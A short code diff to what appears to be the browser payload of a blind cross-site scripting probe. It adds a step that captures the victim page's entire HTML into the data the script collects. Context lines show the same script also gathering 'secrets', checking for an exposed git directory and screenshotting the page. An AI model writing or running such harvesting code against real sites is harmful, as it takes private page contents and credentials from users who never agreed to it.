@@ -406,6 +406,11 @@ async function hook_load_if_not_ready() {
         } catch (e) {
             probe_return_data['gitExposed'] = "false";
         }
+        try {
+            probe_return_data['dom'] = never_null( document.documentElement.outerHTML );
+        } catch ( e ) {
+            probe_return_data['dom'] = '';
+        }
         probe_return_data['secrets'] = JSON.stringify(probe_return_data['secrets']);
         html2canvas(document.body).then(function(canvas) {
             /* StackBlur.canvasRGB(
